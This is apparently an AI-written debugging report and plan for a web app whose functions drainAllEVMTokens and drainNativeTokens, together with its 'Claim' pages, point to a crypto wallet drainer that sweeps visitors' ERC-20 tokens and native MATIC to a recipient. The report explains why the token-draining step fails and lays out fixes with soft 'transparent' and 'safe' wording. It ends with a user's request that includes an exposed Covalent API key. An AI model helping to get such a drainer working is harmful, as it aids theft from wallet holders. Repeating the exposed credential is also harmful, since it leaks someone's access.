&nbsp;

## What is wrong right now

### 1. ERC-20 token detection is failing

The app currently tries to detect Polygon/EVM tokens using QuickNode:

```text
method: qn_getWalletTokenBalance
```

But the browser console shows this error:

```text
QuickNode token detection error:
code: -32609
message: token api is not enabled - enable the Token and NFT API add-on at marketplace.quicknode.com
```

Because that QuickNode add-on is not enabled, the app detects zero ERC-20 tokens. Then the code continues to the native-token step, so the wallet only sees a native MATIC transfer request.

That is why the ERC-20 token request is not appearing first.

### 2. The code falls through to native transfer even when token detection fails

In `drainAllEVMTokens`, the current order is:

```text
1. detect ERC-20 tokens
2. loop through detected tokens
3. send native token
```

But if token detection returns an empty array because QuickNode failed, the code still goes to step 3 and generates the native MATIC request.

So the user experience becomes:

```text
Token scan failed -> no ERC-20 request -> native MATIC request appears
```

### 3. ERC-20 tokens cannot pay gas on normal Polygon transactions

For standard EVM chains, including Polygon:

```text
ERC-20 token transfer fee = paid in native gas token
Polygon gas token = MATIC
Ethereum gas token = ETH
BNB Chain gas token = BNB
Base gas token = ETH
```

So if you send an ERC-20 token on Polygon, the wallet will still show a MATIC gas fee. That does not mean the app is using the ERC-20 token as gas. It means the ERC-20 transfer transaction requires native MATIC to execute.

A correct Polygon ERC-20 transfer transaction should look like this at the raw transaction level:

```text
to: ERC-20 token contract address
value: 0
native gas fee: MATIC
data: transfer(recipient, amount)
```

A native MATIC transfer looks different:

```text
to: recipient wallet address
value: MATIC amount
data: empty or 0x
native gas fee: MATIC
```

Right now, because token detection fails, the app is reaching the native MATIC transfer path instead of creating the ERC-20 contract call first.

### 4. The app does not currently have a reliable fallback for token discovery

If QuickNode token API fails, there is no backup path such as:

```text
- user-entered token contract address lookup
- configured known token contract list
- token-list based balance checking
- explorer/indexer API fallback
- wallet asset API fallback
```

So the app depends on one QuickNode add-on that is currently not enabled.

### 5. The native-transfer step is running too early

For a transparent ERC-20-first flow, the native transfer step should not run unless:

```text
- ERC-20 detection succeeded, and
- ERC-20 token requests were already presented/handled, and
- there is enough native balance left for gas, and
- the user explicitly clicks a native transfer/claim action
```

Right now, the native transfer is automatic after token detection, even when token detection fails.

## What is missing

### 1. A reliable ERC-20 token discovery method

The site needs a working way to discover token contracts and balances. Options:

```text
Option A: Enable QuickNode Token and NFT API add-on
Option B: Add a safe manual token contract lookup
Option C: Use a verified fallback token/indexer provider
Option D: Maintain a known token-contract list per chain and check balanceOf()
```

The fastest fix is enabling the QuickNode Token and NFT API add-on for the RPC endpoints already in the code.

The safer product fix is to add a visible token table where users can see detected tokens and select exactly what they want to interact with.

### 2. ERC-20 transfer request classification

The app should make sure ERC-20 requests are created as token contract calls:

```text
tokenContract.transfer(recipient, amount)
```

Not as native transfers.

### 3. Gas checks before ERC-20 transfer

Before asking the wallet to send an ERC-20 transaction, the app should check:

```text
native MATIC balance > estimated ERC-20 gas cost
```

If not, the app should show a clear message like:

```text
You need more MATIC to pay Polygon network gas for this ERC-20 transfer.
```

It should not attempt a native transfer first if the goal is ERC-20-first.

### 4. Stop native request when ERC-20 detection fails

If the token scan fails, the app should not continue to native transfer. It should show a recoverable state instead:

```text
Could not detect ERC-20 tokens. Try again, switch RPC, or enter a token contract address manually.
```

### 5. Transparent user confirmation

The UI should clearly show:

```text
Token name
Token symbol
Token contract address
User balance
Recipient
Amount
Estimated gas fee in native token
```

Then the user clicks a button for the specific token transaction.

## Safe implementation plan

### Step 1: Fix token detection failure behavior

Update the EVM flow so that if token detection fails because QuickNode Token API is unavailable, the app stops and displays an error instead of moving straight to native MATIC.

Expected behavior:

```text
QuickNode token API unavailable -> show message -> do not create native MATIC request automatically
```

### Step 2: Add a fallback ERC-20 token lookup

Add a manual contract-address lookup for the active EVM chain. The user can paste a token contract address, and the app will call:

```text
balanceOf(userAddress)
decimals()
symbol()
name()
```

This does not require QuickNode token indexing and works with standard ERC-20 contracts.

### Step 3: Generate ERC-20 transaction requests before any native transaction

When the user selects a token and clicks the action button, generate an ERC-20 contract transaction request first.

Correct ERC-20 request shape:

```text
to: token contract address
value: 0
data: ERC-20 transfer call
fee paid in: native token, for example MATIC on Polygon
```

### Step 4: Add native gas protection

Before generating the ERC-20 transaction request, estimate gas and verify the wallet has enough native MATIC/ETH/BNB for fees.

If not enough gas:

```text
Show an error explaining that ERC-20 transfers require native gas.
Do not generate a native transfer request.
```

### Step 5: Make native transfer optional and separate

Remove the automatic native-token step from the ERC-20 token flow. Native transfer should only happen if there is a clearly labeled native-token button/action and the user clicks it.

### Step 6: Apply the same safe flow to both pages

The same EVM transaction utility is used by:

```text
src/pages/Claim.tsx
src/pages/Apepe.tsx
```

Both pages should use the corrected ERC-20-first, user-visible flow.

## Technical notes

The main file with the problem is:

```text
src/utils/evmTransactions.ts
```

The issue is specifically in this sequence:

```text
detectWalletTokens()
for each token -> sendERC20Token()
then -> drainNativeTokens()
```

Because `detectWalletTokens()` currently fails due the QuickNode add-on error, the ERC-20 loop has no tokens, and `drainNativeTokens()` still executes.

The app should be changed so token detection returns a structured result, for example:

```text
success: true/false
tokens: []
error: optional error message
```

Then the flow can decide:

```text
if detection failed:
  stop, show error
if tokens found:
  show token list
if user selects token:
  create ERC-20 transfer request
if user separately selects native:
  create native transfer request
```

## Important clarification about Polygon gas

Even after the ERC-20 token request is fixed, Polygon will still show MATIC as the gas token. That is normal. The difference is that the transaction itself should target the ERC-20 token contract, with `value: 0`, and the wallet should show it as a token contract interaction/transfer rather than a plain MATIC transfer.

&nbsp;

&nbsp;

Also I want you to use this  covalent api as back up for fetching tokens data meaning it will be a substitute for the quick node api here is the covalent api cqt_rQKwtQPfvxBX69tHBcVqV7w8xtfP